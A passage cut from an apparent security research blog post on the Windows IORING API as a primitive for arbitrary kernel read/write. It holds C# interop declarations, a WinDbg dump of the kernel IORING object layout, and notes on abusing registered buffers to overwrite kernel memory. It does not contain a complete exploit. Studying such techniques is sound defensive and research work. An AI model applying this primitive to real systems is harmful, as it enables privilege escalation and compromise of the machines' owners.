# https://knifecoat.com/Posts/Arbitrary+Kernel+RW+using+IORING's


    UInt32 completionQueueSize,  
    ref IntPtr hRing);
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">The most salient detail here is that the <code>IORING_VERSION</code> is important. The version of the <code>IORING</code> dictates what capabilities it has.</p></div><div class="el-pre"><pre><code data-line="0" class="language-cs">internal enum IORING_VERSION  
{  
    IORING_VERSION_INVALID = 0,  
    IORING_VERSION_1, // Read (21H2)
    IORING_VERSION_2, // Has a bugfix, I think, for v1 (21H2)
    IORING_VERSION_3 = 300 // Read, Write, Flush, Drain (22H2)
}
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">This primitive can technically be used, in part, from <code>21H2</code>. Counterintuitively, having <code>READ</code> permissions actually grants you <code>KM Write</code> and vice versa.</p></div><div class="el-p"><p dir="auto">When you create an <code>IORING</code> you get back a handle to interact with the object. This is not a <em>real handle</em> it is a pointer to a UM object for your <code>IORING</code>.</p></div><div class="el-pre"><pre><code data-line="0" class="language-cs">[StructLayout(LayoutKind.Sequential)]  
internal struct HIORING  
{  
    public IntPtr handle;  
    public NT_IORING_INFO Info;  
    public UInt32 IoRingKernelAcceptedVersion;  
    public IntPtr RegBufferArray;   // Pointer to array of IORING opperations
    public UInt32 BufferArraySize;  // Size of array of opperation pointers
    public IntPtr Unknown;  
    public UInt32 FileHandlesCount;  
    public UInt32 SubQueueHead;  
    public UInt32 SubQueueTail;  
}
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">At the same time a kernel object is also created.</p></div><div class="el-pre"><pre><code data-line="0" class="language-c">1: kd&gt; dt *!*IORING*
.....
1: kd&gt; dt ntkrnlmp!_IORING_OBJECT
   +0x000 Type             : Int2B
   +0x002 Size             : Int2B
   +0x008 UserInfo         : _NT_IORING_INFO
   +0x038 Section          : Ptr64 Void
   +0x040 SubmissionQueue  : Ptr64 _NT_IORING_SUBMISSION_QUEUE
   +0x048 CompletionQueueMdl : Ptr64 _MDL
   +0x050 CompletionQueue  : Ptr64 _NT_IORING_COMPLETION_QUEUE
   +0x058 ViewSize         : Uint8B
   +0x060 InSubmit         : Int4B
   +0x068 CompletionLock   : Uint8B
   +0x070 SubmitCount      : Uint8B
   +0x078 CompletionCount  : Uint8B
   +0x080 CompletionWaitUntil : Uint8B
   +0x088 CompletionEvent  : _KEVENT
   +0x0a0 SignalCompletionEvent : UChar
   +0x0a8 CompletionUserEvent : Ptr64 _KEVENT
   +0x0b0 RegBuffersCount  : Uint4B // Size of array of opperation pointers
   +0x0b8 RegBuffers       : Ptr64 Ptr64 _IOP_MC_BUFFER_ENTRY // Pointer to array of opperations
   +0x0c0 RegFilesCount    : Uint4B
   +0x0c8 RegFiles         : Ptr64 Ptr64 Void
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">You can then queue read and write operations for your <code>IORING</code>.</p></div><div class="el-pre"><pre><code data-line="0" class="language-cs">// Read data from a "file", can be used to overwrite data from the file at an arbitrary KM address

[DllImport("kernelbase.dll")]  
internal static extern UInt32 BuildIoRingReadFile(  
    IntPtr ioRing,  
    ref IORING_HANDLE_REF fileRef,  
    ref IORING_BUFFER_REF dataRef,  
    UInt32 numberOfBytesToRead,  
    UInt64 fileOffset,  
